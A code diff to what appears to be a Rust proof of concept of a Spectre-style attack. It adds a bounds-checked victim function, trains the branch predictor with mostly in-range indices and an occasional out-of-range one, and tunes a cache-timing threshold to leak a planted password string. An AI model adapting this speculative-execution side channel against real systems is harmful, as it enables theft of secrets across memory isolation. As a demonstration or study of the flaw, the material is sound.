@@ -10,7 +10,7 @@ use std::arch::x86_64::_rdtsc;
 
 // TODO, remove the tming based, use the 3/4 of the avg and the best,second best strategy, it is
 // more resilient
-const THRESHOLD: u64 = 120;
+const THRESHOLD: u64 = 80;
 const STRIDE: usize = 512;
 
 const data_size: usize = 11;
@@ -21,6 +21,21 @@ const secret_data: &str = "My password";
 
 // To avoid optimization of the victim code
 static mut tmp: u8 = 0;
+
+#[no_mangle]
+#[allow(dead_code)]
+fn victim_code(branch_selector: usize) {
+    let secret_data_bytes = secret_data.as_bytes();
+
+    if branch_selector < data_size {
+        // tmp is mut static which means that its mutability is rule by unsafe blocks :"
+        unsafe {
+            let addr = &array_for_prediction[secret_data_bytes[branch_selector] as usize * STRIDE]
+                as *const u8;
+            tmp &= read_memory_offset(addr);
+        }
+    }
+}
 
 fn read_memory_offset(ptr: *const u8) -> u8 {
     let result: u8 = 0;
@@ -82,12 +97,15 @@ fn read_memory_byte(malicious_x: usize) -> ([u64; 2], [u64; 2]) {
         }
 
         // Set the cache
-        for j in 0..100 {
-            unsafe {
-                let addr = &array_for_prediction[secret_data_bytes[malicious_x] as usize * STRIDE]
-                    as *const u8;
-                tmp &= read_memory_offset(addr);
+        let safe_index = i % data_size as u64;
+        for j in 0..512 {
+            let location = if (j + 1) % 30 != 0 {
+                safe_index as usize
+            } else {
+                malicious_x
             };
+
+            victim_code(location);
         }
 
         for j in 0..256 {
